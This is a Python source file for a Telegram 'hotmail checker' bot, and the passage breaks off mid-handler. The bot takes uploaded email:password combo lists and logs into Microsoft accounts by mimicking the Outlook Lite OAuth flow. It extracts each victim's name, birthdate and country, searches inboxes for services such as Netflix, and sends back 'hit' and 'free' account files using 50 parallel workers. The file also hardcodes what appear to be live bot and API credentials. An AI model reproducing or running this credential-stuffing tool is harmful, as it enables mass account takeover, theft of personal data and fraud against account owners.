
import asyncio
import re
import uuid
import time
import json
import logging
import aiohttp
import aiofiles
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.enums import ParseMode, ChatAction
import os
import queue
import threading
from collections import defaultdict
import random
import string
import shutil

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = "8505518070:AAGj8f5GDZiwbDwGaN3CLvaVeSRY1-6wCmY"
API_ID = 23933044
API_HASH = "6df11147cbec7d62a323f0f498c8c03a"

# Owner information
OWNER_USERNAME = "@still_alivenow"
OWNER_ID = 7125341830

# Thread configuration
MAX_THREADS = 10
BATCH_SIZE = 10

# Initialize bot
app = Client(
    "hotmail_checker_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# Global variables for task management
active_tasks: Dict[int, Dict] = {}  # user_id -> task info
copy_cache = {}  # Cache for copy functionality

class OutlookProfileChecker:
    def __init__(self, user_id: int = None, debug: bool = False):
        self.user_id = user_id
        self.debug = debug
        self.session = None
        self.uuid = str(uuid.uuid4())
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    def log(self, message: str):
        if self.debug:
            logger.info(f"[DEBUG {self.user_id}] {message}")
    
    async def login_and_get_token(self, email: str, password: str) -> Dict:
        """Step 1-5: Login and get access token"""
        try:
            self.log(f"Starting login for: {email}")
            
            # Step 1: IDP check
            self.log("Step 1: IDP check...")
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            async with self.session.get(url1, headers=headers1, timeout=15) as r1:
                text1 = await r1.text()
                self.log(f"IDP Response: {r1.status}")
                
                if "Neither" in text1 or "Both" in text1 or "Placeholder" in text1 or "OrgId" in text1:
                    self.log("❌ IDP check failed")
                    return {"status": "BAD", "token": None, "cid": None, "error": "IDP check failed"}
                
                if "MSAccount" not in text1:
                    self.log("❌ MSAccount not found")
                    return {"status": "BAD", "token": None, "cid": None, "error": "MSAccount not found"}
                
                self.log("✅ IDP check successful")
            
            # Step 2: OAuth authorize
            self.log("Step 2: OAuth authorize...")
            await asyncio.sleep(0.5)
            
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            async with self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15) as r2:
                text2 = await r2.text()
                
                url_match = re.search(r'urlPost":"([^"]+)"', text2)
                ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', text2)
                
                if not url_match or not ppft_match:
                    self.log("❌ PPFT or URL not found")
                    return {"status": "BAD", "token": None, "cid": None, "error": "PPFT not found"}
                
                post_url = url_match.group(1).replace("\\/", "/")
                ppft = ppft_match.group(1)
            
            # Step 3: Login POST
            self.log("Step 3: Login POST...")
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": url2
            }
            
            async with self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15) as r3:
                text3 = await r3.text()
                self.log(f"Login Response: {r3.status}")
                
                if "account or password is incorrect" in text3 or text3.count("error") > 0:
                    self.log("❌ Wrong password")
                    return {"status": "BAD", "token": None, "cid": None, "error": "Wrong password"}
                
                if "https://account.live.com/identity/confirm" in text3:
                    return {"status": "BAD", "token": None, "cid": None, "error": "Identity confirmation required"}
                
                if "https://account.live.com/Abuse" in text3:
                    return {"status": "BAD", "token": None, "cid": None, "error": "Account blocked/abuse"}
                
                location = r3.headers.get("Location", "")
                if not location:
                    self.log("❌ Redirect location not found")
                    return {"status": "BAD", "token": None, "cid": None, "error": "No redirect location"}
                
                code_match = re.search(r'code=([^&]+)', location)
                if not code_match:
                    self.log("❌ Auth code not found")
                    return {"status": "BAD", "token": None, "cid": None, "error": "Auth code not found"}
                
                code = code_match.group(1)
                self.log(f"✅ Auth code obtained: {code[:30]}...")
                
                # Get cookies from session
                mspcid = None
                for cookie in self.session.cookie_jar:
                    if cookie.key == "MSPCID":
                        mspcid = cookie.value
                        break
                
                if not mspcid:
                    self.log("❌ CID not found")
                    return {"status": "BAD", "token": None, "cid": None, "error": "CID not found"}
                
                cid = mspcid.upper()
                self.log(f"CID: {cid}")
            
            # Step 4: Get token
            self.log("Step 4: Getting token...")
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            async with self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                                        data=token_data, 
                                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                                        timeout=15) as r4:
                text4 = await r4.text()
                
                if "access_token" not in text4:
                    self.log(f"❌ Access token not received")
                    return {"status": "BAD", "token": None, "cid": None, "error": "No access token"}
                
                token_json = json.loads(text4)
                access_token = token_json["access_token"]
                self.log(f"✅ Token obtained successfully")
                
                return {
                    "status": "SUCCESS",
                    "token": access_token,
                    "cid": cid,
                    "email": email
                }
                
        except asyncio.TimeoutError:
            self.log("❌ Timeout")
            return {"status": "TIMEOUT", "token": None, "cid": None, "error": "Timeout"}
        except Exception as e:
            self.log(f"❌ Exception: {str(e)}")
            return {"status": "ERROR", "token": None, "cid": None, "error": str(e)}
    
    async def get_profile_info(self, access_token: str, cid: str) -> Dict:
        """Step 6: Get profile information from V1Profile API"""
        try:
            self.log("Step 6: Getting profile information...")
            
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            async with self.session.get(
                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                headers=profile_headers,
                timeout=15
            ) as response:
                if response.status != 200:
                    self.log(f"❌ Profile API failed: {response.status}")
                    return {"status": "ERROR", "profile": None, "error": f"HTTP {response.status}"}
                
                profile_data = await response.json()
                self.log(f"✅ Profile data received")
                
                # Parse profile data
                name = ""
                country = ""
                birthdate = ""
                
                # Extract name from names array
                if "names" in profile_data and len(profile_data["names"]) > 0:
                    name_data = profile_data["names"][0]
                    if "displayName" in name_data:
                        name = name_data["displayName"]
                
                # Extract country and birthdate from accounts array
                if "accounts" in profile_data and len(profile_data["accounts"]) > 0:
                    account_data = profile_data["accounts"][0]
                    
                    if "location" in account_data:
                        country = account_data["location"]
                    
                    if all(key in account_data for key in ["birthDay", "birthMonth", "birthYear"]):
                        birth_day = account_data["birthDay"]
                        birth_month = account_data["birthMonth"]
                        birth_year = account_data["birthYear"]
                        birthdate = f"{birth_day}-{birth_month}-{birth_year}"
                
                return {
                    "status": "SUCCESS",
                    "profile": {
                        "name": name,
                        "country": country,
                        "birthdate": birthdate,
                        "raw_data": profile_data
                    }
                }
                
        except Exception as e:
            self.log(f"❌ Profile error: {str(e)}")
            return {"status": "ERROR", "profile": None, "error": str(e)}
    
    async def search_inbox(self, access_token: str, cid: str, search_query: str) -> Dict:
        """Search inbox for specific keywords"""
        try:
            self.log(f"Searching inbox for: {search_query}")
            
            search_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json"
            }
            
            # Search payload
            search_payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Pacific Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": search_query},
                    "RefiningQueries": None,
                    "Size": 25,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": [
                        "Suggestion", "NoResultModification", 
                        "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"
                    ]
                },
                "LogicalId": str(uuid.uuid4())
            }
            
            async with self.session.post(
                "https://outlook.live.com/searchservice/api/v2/query?n=88&cv=z%2B4rC2Rg7h%2BxLG28lplshj.124",
                headers=search_headers,
                json=search_payload,
                timeout=30
            ) as response:
                if response.status != 200:
                    self.log(f"❌ Search API failed: {response.status}")
                    return {"status": "ERROR", "results": None, "error": f"HTTP {response.status}"}
                
                search_results = await response.json()
                self.log(f"✅ Search results received")
                
                # Parse search results
                return await self._parse_search_results(search_query, search_results)
                
        except Exception as e:
            self.log(f"❌ Search error: {str(e)}")
            return {"status": "ERROR", "results": None, "error": str(e)}
    
    async def _parse_search_results(self, search_query: str, search_results: Dict) -> Dict:
        """Parse search results from API response"""
        try:
            total_results = 0
            has_results = False
            last_message_date = ""
            preview_text = ""
            senders = set()
            items_count = 0
            
            # Parse the response structure
            if "EntitySets" in search_results:
                for entity_set in search_results["EntitySets"]:
                    if "ResultSets" in entity_set:
                        for result_set in entity_set["ResultSets"]:
                            # Get total count
                            if "Total" in result_set:
                                total_results = result_set["Total"]
                            
                            # Check if there are results
                            if "Results" in result_set and len(result_set["Results"]) > 0:
                                has_results = True
                                items_count = len(result_set["Results"])
                                
                                # Get first item for preview and last message date
                                first_item = result_set["Results"][0]
                                
                                # Check Source structure
                                if "Source" in first_item:
                                    source = first_item["Source"]
                                    
                                    # Extract last message date
                                    if "LastDeliveryOrRenewTime" in source:
                                        last_message_date = source["LastDeliveryOrRenewTime"]
                                    elif "LastDeliveryTime" in source:
                                        last_message_date = source["LastDeliveryTime"]
                                    
                                    # Extract preview text
                                    if "Preview" in source:
                                        preview_text = source["Preview"]
                                    elif "HitHighlightedSummary" in first_item:
                                        preview_text = first_item["HitHighlightedSummary"]
                                    
                                    # Extract senders
                                    if "UniqueSenders" in source:
                                        senders.update(source["UniqueSenders"])
                                    elif "From" in source and "EmailAddress" in source["From"]:
                                        if "Name" in source["From"]["EmailAddress"]:
                                            senders.add(source["From"]["EmailAddress"]["Name"])
                            
                            # Also check for items in "Items" field (alternative structure)
                            elif "Items" in result_set and len(result_set["Items"]) > 0:
                                has_results = True
                                items_count = len(result_set["Items"])
                                
                                # Get first item
                                first_item = result_set["Items"][0]
                                
                                # Extract last message date
                                if "LastMessageTime" in first_item:
                                    last_message_date = first_item["LastMessageTime"]
                                elif "LastDeliveryTime" in first_item:
                                    last_message_date = first_item["LastDeliveryTime"]
                                
                                # Extract preview text
                                if "Preview" in first_item:
                                    preview_text = first_item["Preview"]
                                elif "Snippet" in first_item:
                                    preview_text = first_item["Snippet"]
                                
                                # Extract senders
                                if "UniqueSenders" in first_item:
                                    senders.update(first_item["UniqueSenders"])

            # Clean up preview text
            if preview_text:
                # Remove invisible characters and excessive whitespace
                preview_text = re.sub(r'[\u2000-\u200F\u2028-\u202F\u205F-\u206F\uFEFF\u00AD]', '', preview_text)
                preview_text = re.sub(r'\s+', ' ', preview_text).strip()
            
            # Format last message date if it exists
            if last_message_date:
                try:
                    # Convert ISO format to readable date
                    if 'T' in last_message_date:
                        date_part = last_message_date.split('T')[0]
                        last_message_date = date_part
                except:
                    pass
            
            found_messages = {
                "total": total_results,
                "has_results": has_results,
                "last_message_date": last_message_date,
                "preview": preview_text,
                "senders": list(senders),
                "items_count": items_count
            }
            
            return {
                "status": "SUCCESS",
                "search_query": search_query,
                "results": found_messages if has_results else None,
                "has_results": has_results
            }
            
        except Exception as e:
            self.log(f"❌ Parse error: {str(e)}")
            return {
                "status": "ERROR",
                "search_query": search_query,
                "results": None,
                "has_results": False,
                "error": str(e)
            }
    
    async def check_account(self, email: str, password: str, search_queries: List[str] = None) -> Dict:
        """Complete account check with profile and inbox search"""
        try:
            # Step 1-5: Login and get token
            login_result = await self.login_and_get_token(email, password)
            if login_result["status"] != "SUCCESS":
                return login_result
            
            access_token = login_result["token"]
            cid = login_result["cid"]
            
            # Step 6: Get profile info
            profile_result = await self.get_profile_info(access_token, cid)
            
            # Step 7-8: Search inbox for queries
            search_results = {}
            if search_queries:
                for query in search_queries:
                    search_result = await self.search_inbox(access_token, cid, query)
                    search_results[query] = search_result
            
            # Combine all results
            return {
                "status": "SUCCESS",
                "email": email,
                "password": password,
                "profile": profile_result.get("profile") if profile_result["status"] == "SUCCESS" else None,
                "searches": search_results,
                "token": access_token,
                "cid": cid
            }
            
        except Exception as e:
            self.log(f"❌ Complete check error: {str(e)}")
            return {"status": "ERROR", "error": str(e), "email": email, "password": password}

# Task management functions
def is_user_busy(user_id: int) -> bool:
    """Check if user has an active task"""
    return user_id in active_tasks

def add_task(user_id: int, task_type: str, data: Dict):
    """Add task to active tasks"""
    active_tasks[user_id] = {
        "type": task_type,
        "data": data,
        "start_time": time.time(),
        "running": True
    }

def remove_task(user_id: int):
    """Remove task from active tasks"""
    if user_id in active_tasks:
        del active_tasks[user_id]

def stop_user_task(user_id: int):
    """Stop user's task"""
    if user_id in active_tasks:
        active_tasks[user_id]["running"] = False
        return True
    return False

# UI Helper functions
ANIMATION_FRAMES = ["⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻", "⣽"]
PROGRESS_BAR = "█"
EMPTY_BAR = "░"

def create_progress_bar(percentage: float, width: int = 20) -> str:
    """Create a visual progress bar"""
    filled = int(width * percentage / 100)
    bar = PROGRESS_BAR * filled + EMPTY_BAR * (width - filled)
    return f"`[{bar}] {percentage:.1f}%`"

def get_animation_frame() -> str:
    """Get next animation frame"""
    current_frame = random.choice(ANIMATION_FRAMES)
    return f"**{current_frame}**"

def create_main_keyboard() -> InlineKeyboardMarkup:
    """Create main menu keyboard"""
    keyboard = [
        [
            InlineKeyboardButton("🔍 Single Check", callback_data="single_check"),
            InlineKeyboardButton("📁 Batch Check", callback_data="batch_check")
        ],
        [
            InlineKeyboardButton("🛑 Stop Task", callback_data="stop_task"),
            InlineKeyboardButton("📊 Status", callback_data="status")
        ],
        [
            InlineKeyboardButton("📖 Help", callback_data="help"),
            InlineKeyboardButton("👑 Owner", url=f"tg://user?id={OWNER_ID}")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_back_keyboard() -> InlineKeyboardMarkup:
    """Create back to main menu keyboard"""
    keyboard = [
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_copy_keyboard(text_to_copy: str) -> InlineKeyboardMarkup:
    """Create copy keyboard with working copy button"""
    # Store text in cache with unique ID
    copy_id = str(uuid.uuid4())
    copy_cache[copy_id] = text_to_copy
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Copy Result", callback_data=f"copy_{copy_id}"),
            InlineKeyboardButton("🔄 New Check", callback_data="new_check")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def format_credits() -> str:
    """Format owner credits"""
    credits = f"""
    ┌─────────────────┐
    │   **CREDITS**   │
    ├─────────────────┤
    │ • **Owner**: {OWNER_USERNAME}
    │ • **Bot**: @genzhotmailchkbot
    │ • **Version**: 2.0
    └─────────────────┘
    """
    return credits

async def send_typing_animation(chat_id: int, duration: int = 2):
    """Send typing animation"""
    await app.send_chat_action(chat_id, ChatAction.TYPING)
    await asyncio.sleep(duration)

async def send_thinking_animation(chat_id: int):
    """Send thinking animation"""
    await app.send_chat_action(chat_id, ChatAction.CHOOSE_STICKER)
    await asyncio.sleep(1)

async def process_single_account(email: str, password: str, targets: List[str]) -> Dict:
    """Process single account"""
    try:
        async with OutlookProfileChecker(debug=False) as checker:
            return await checker.check_account(email, password, targets)
    except Exception as e:
        return {"status": "ERROR", "error": str(e), "email": email, "password": password}

# Worker function for batch processing with 50 threads
async def batch_worker(user_id: int, accounts: List[Tuple[str, str]], targets: List[str], message: Message):
    """Process batch accounts with 50 concurrent workers"""
    total_accounts = len(accounts)
    processed = 0
    successful = 0
    free_accounts = []
    hit_files = defaultdict(list)
    
    # Create results directory
    results_dir = f"results_{user_id}_{int(time.time())}"
    os.makedirs(results_dir, exist_ok=True)
    
    animation_index = 0
    last_update = 0
    
    try:
        # Send starting message with animation
        status_msg = await message.reply_text(
            f"🚀 **Starting Batch Processing**\n"
            f"{get_animation_frame()} Initializing 50 threads...",
            reply_markup=create_back_keyboard()
        )
        
        await asyncio.sleep(1)
        
        # Semaphore to limit concurrent tasks
        semaphore = asyncio.Semaphore(MAX_THREADS)
        
        async def process_with_semaphore(email: str, password: str):
            async with semaphore:
                return await process_single_account(email, password, targets)
        
        # Process accounts in batches
        for i in range(0, total_accounts, BATCH_SIZE):
            batch = accounts[i:i + BATCH_SIZE]
            tasks = []
            
            for email, password in batch:
                if not is_user_busy(user_id) or not active_tasks[user_id].get("running", True):
                    break
                
                tasks.append(process_with_semaphore(email, password))
            
            # Run batch concurrently
            if tasks:
                batch_results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for j, result in enumerate(batch_results):
                    if isinstance(result, Exception):
                        logger.error(f"Error processing account: {result}")
                        continue
                    
                    email, password = batch[j]
                    processed += 1
                    
                    if result["status"] == "SUCCESS":
                        successful += 1
                        
                        # Check if any target found
                        target_found = False
                        for target in targets:
                            if target in result.get("searches", {}):
                                search_result = result["searches"][target]
                                if search_result["status"] == "SUCCESS" and search_result.get("has_results"):
                                    target_found = True
                                    # Create the formatted line in EXACT requested format
                                    profile = result.get("profile", {})
                                    line = f"{email}:{password}"
                                    
                                    if profile:
                                        name = profile.get('name', '').strip()
                                        if name:
                                            line += f" | Name = {name}"
                                        
                                        birthdate = profile.get('birthdate', '').strip()
                                        if birthdate:
                                            line += f" | birthDate = {birthdate}"
                                        
                                        country = profile.get('country', '').strip()
                                        if country:
                                            line += f" | Country = {country}"
                                    
                                    if search_result.get("results"):
                                        res = search_result["results"]
                                        line += f" | Target = {target}"
                                        line += f" | Total = {res.get('total', 0)}"
                                        line += f" | hasMsgFromTarget = ✔️"
                                        
                                        if res.get('preview'):
                                            preview = res['preview']
                                            # Clean up preview text
                                            preview = re.sub(r'[\u2000-\u200F\u2028-\u202F\u205F-\u206F\uFEFF\u00AD]', '', preview)
                                            preview = re.sub(r'\s+', ' ', preview).strip()
                                            if len(preview) > 80:
                                                preview = preview[:77] + "..."
                                            line += f" | Preview = {preview}"
                                        
                                        if res.get('last_message_date'):
                                            line += f" | lastMsg = {res['last_message_date']}"
                                        
                                        line += " | BotBy = @still_alivenow"
                                    
                                    hit_files[target].append(line)
                                    
                                    # Send immediate notification for hits in EXACT requested format
                                    try:
                                        hit_message = (
                                            f"🎯 **TARGET HIT!**\n"
                                            f"{get_animation_frame()} **{target.upper()}** Found!\n\n"
                                            f"```\n{line}\n```\n\n"
                                            f"_Click above to copy_\n\n"
                                            f"👑 **Configured by:** {OWNER_USERNAME}"
                                        )
                                        
                                        # Create copy keyboard
                                        copy_id = str(uuid.uuid4())
                                        copy_cache[copy_id] = line
                                        copy_keyboard = InlineKeyboardMarkup([
                                            [
                                                InlineKeyboardButton("📋 Copy", callback_data=f"copy_{copy_id}"),
                                                InlineKeyboardButton("🔙 Menu", callback_data="back_to_menu")
                                            ]
                                        ])
                                        
                                        await app.send_message(
                                            user_id,
                                            hit_message,
                                            parse_mode=ParseMode.MARKDOWN,
                                            reply_markup=copy_keyboard
                                        )
                                    except Exception as e:
                                        logger.error(f"Error sending hit notification: {e}")
                                    break
                        
                        # If no target found, add to free accounts
                        if not target_found:
                            free_accounts.append(f"{email}:{password}")
                    
                    # Update status with animation every 20 accounts or every 2 seconds
                    current_time = time.time()
                    if processed % 20 == 0 or current_time - last_update > 2:
                        last_update = current_time
                        animation_index = (animation_index + 1) % len(ANIMATION_FRAMES)
                        percentage = (processed / total_accounts) * 100
                        
                        try:
                            await status_msg.edit_text(
                                f"⚡ **Batch Processing**\n"
                                f"{ANIMATION_FRAMES[animation_index]} **Working (50 threads)**\n\n"
                                f"📊 **Progress:**\n"
                                f"{create_progress_bar(percentage)}\n"
                                f"• **Processed:** `{processed}/{total_accounts}`\n"
                                f"• **Successful:** `{successful}`\n"
                                f"• **Hits Found:** `{sum(len(v) for v in hit_files.values())}`\n"
                                f"• **Free:** `{len(free_accounts)}`\n\n"
                                f"🎯 **Targets:** {', '.join(targets)}\n"
                                f"⚡ **Threads:** 50",
                                parse_mode=ParseMode.MARKDOWN,
                                reply_markup=create_back_keyboard()
                            )
                        except:
                            pass
                    
                    # Small delay to avoid rate limiting
                    await asyncio.sleep(0.05)
        
        # Save results to files
        for target, hits in hit_files.items():
            if hits:
                filename = f"{results_dir}/hits_{target}.txt"
                async with aiofiles.open(filename, "w", encoding="utf-8") as f:
                    for line in hits:
                        await f.write(line + "\n")
                
                # Send hits file with animation
                try:
                    await send_typing_animation(user_id, 1)
                    await app.send_document(
                        user_id,
                        filename,
                        caption=f"✅ **Hits for: {target}**\n"
                               f"📊 **Found:** {len(hits)} accounts\n"
                               f"⚡ **Threads:** 50\n"
                               f"👑 **By:** {OWNER_USERNAME}",
                        reply_markup=create_back_keyboard()
                    )
                except Exception as e:
                    logger.error(f"Error sending hits file for {target}: {e}")
        
        # Save free accounts
        if free_accounts:
            free_filename = f"{results_dir}/free.txt"
            async with aiofiles.open(free_filename, "w", encoding="utf-8") as f:
                for line in free_accounts:
                    await f.write(line + "\n")
            
            # Send free accounts file
            try:
                await send_typing_animation(user_id, 1)
                await app.send_document(
                    user_id,
                    free_filename,
                    caption=f"✅ **Free Accounts**\n"
                           f"📊 **Count:** {len(free_accounts)}\n"
                           f"⚡ **Threads:** 50\n"
                           f"👑 **By:** {OWNER_USERNAME}",
                    reply_markup=create_back_keyboard()
                )
            except Exception as e:
                logger.error(f"Error sending free accounts file: {e}")
        
        # Clean up files and folder PROPERLY
        try:
            for file in os.listdir(results_dir):
                file_path = os.path.join(results_dir, file)
                try:
                    if os.path.isfile(file_path):
                        os.unlink(file_path)
                    elif os.path.isdir(file_path):
                        shutil.rmtree(file_path)
                except Exception as e:
                    logger.error(f"Error deleting file {file_path}: {e}")
            
            # Remove the directory itself
            os.rmdir(results_dir)
            logger.info(f"Cleaned up directory: {results_dir}")
        except Exception as e:
            logger.error(f"Error cleaning up directory {results_dir}: {e}")
        
        # Send final summary with celebration
        await send_typing_animation(user_id, 2)
        
        summary = (
            f"🎉 **BATCH PROCESSING COMPLETE!**\n\n"
            f"📈 **FINAL STATISTICS**\n"
            f"┌─────────────────────────────┐\n"
            f"│ • **Total Accounts**: {total_accounts}\n"
            f"│ • **Successfully Checked**: {successful}\n"
            f"│ • **Failed**: {total_accounts - successful}\n"
            f"│ • **Hits Found**: {sum(len(v) for v in hit_files.values())}\n"
            f"│ • **Free Accounts**: {len(free_accounts)}\n"
            f"│ • **Threads Used**: 50 ⚡\n"
            f"└─────────────────────────────┘\n\n"
        )
        
        # Add target-wise breakdown
        if hit_files:
            summary += "🎯 **TARGET BREAKDOWN**\n"
            for target, hits in hit_files.items():
                summary += f"• `{target}`: {len(hits)} hits\n"
        
        summary += f"\n{format_credits()}"
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 New Check", callback_data="new_check")],
            [InlineKeyboardButton("👑 Contact Owner", url=f"tg://user?id={OWNER_ID}")]
        ])
        
        await status_msg.edit_text(summary, parse_mode=ParseMode.MARKDOWN, reply_markup=keyboard)
        
    except Exception as e:
        logger.error(f"Batch worker error: {e}")
        await message.reply_text(
            f"❌ **Error in batch processing**\n"
            f"Error: `{str(e)}`\n\n"
            f"Please try again or contact {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
    finally:
        remove_task(user_id)

# Bot commands and handlers
@app.on_callback_query()
async def callback_handler(client, callback_query):
    """Handle callback queries"""
    user_id = callback_query.from_user.id
    data = callback_query.data
    
    try:
        if data == "back_to_menu":
            await callback_query.answer()
            await send_main_menu(callback_query.message)
        
        elif data == "single_check":
            await callback_query.answer()
            await callback_query.message.edit_text(
                f"🔍 **Single Account Check**\n\n"
                f"**Usage:**\n"
                f"`/check email:password target1 target2`\n\n"
                f"**Example:**\n"
                f"`/check test@hotmail.com:password123 netflix amazon`\n\n"
                f"**Note:** Separate multiple targets with space",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=create_back_keyboard()
            )
        
        elif data == "batch_check":
            await callback_query.answer()
            await callback_query.message.edit_text(
                f"📁 **Batch Account Check**\n\n"
                f"**How to use:**\n"
                f"1. Send me a `.txt` file with email:password combos\n"
                f"2. Reply to that file with `/batch target1 target2`\n\n"
                f"**Format:**\n"
                f"```\nemail1:password1\nemail2:password2\nemail3:password3\n```\n\n"
                f"**Features:**\n"
                f"• 50 concurrent threads ⚡\n"
                f"• Real-time hit notifications\n"
                f"• Progress tracking\n"
                f"• Sends hit_{target}.txt and free.txt files",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=create_back_keyboard()
            )
        
        elif data == "stop_task":
            await callback_query.answer()
            if stop_user_task(user_id):
                await callback_query.message.edit_text(
                    f"🛑 **Task Stopped Successfully**\n\n"
                    f"Your current task has been terminated.",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=create_back_keyboard()
                )
            else:
                await callback_query.message.edit_text(
                    f"ℹ️ **No Active Task**\n\n"
                    f"You don't have any running task to stop.",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=create_back_keyboard()
                )
        
        elif data == "status":
            await callback_query.answer()
            if user_id in active_tasks:
                task = active_tasks[user_id]
                elapsed = time.time() - task["start_time"]
                
                status_text = (
                    f"📊 **Task Status**\n\n"
                    f"┌─────────────────────┐\n"
                    f"│ • **Type**: {task['type'].upper()}\n"
                    f"│ • **Status**: {'✅ Running' if task.get('running', True) else '🛑 Stopped'}\n"
                    f"│ • **Duration**: {elapsed:.1f}s\n"
                )
                
                if task["type"] == "batch":
                    status_text += f"│ • **Accounts**: {task['data'].get('total_accounts', 'N/A')}\n"
                    status_text += f"│ • **Targets**: {', '.join(task['data'].get('targets', []))}\n"
                    status_text += f"│ • **Threads**: 50 ⚡\n"
                
                status_text += f"└─────────────────────┘\n\n"
                status_text += f"{get_animation_frame()} **Working...**"
                
            else:
                status_text = (
                    f"📊 **Task Status**\n\n"
                    f"ℹ️ No active task found.\n"
                    f"You can start a new task from the main menu."
                )
            
            await callback_query.message.edit_text(
                status_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=create_back_keyboard()
            )
        
        elif data == "help":
            await callback_query.answer()
            await callback_query.message.edit_text(
                f"📖 **Help & Instructions**\n\n"
                f"**Available Commands:**\n"
                f"• `/check` - Check single account\n"
                f"• `/batch` - Batch check multiple accounts\n"
                f"• `/stop` - Stop current task\n"
                f"• `/status` - Check task status\n\n"
                f"**Features:**\n"
                f"• Real-time hit notifications\n"
                f"• Profile information extraction\n"
                f"• Inbox search for targets\n"
                f"• Batch processing with 50 threads ⚡\n"
                f"• Automatic file cleanup\n\n"
                f"**Need Help?**\n"
                f"Contact: {OWNER_USERNAME}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=create_back_keyboard()
            )
        
        elif data == "new_check":
            await callback_query.answer()
            await send_main_menu(callback_query.message)
        
        elif data.startswith("copy_"):
            copy_id = data.split("_")[1]
            if copy_id in copy_cache:
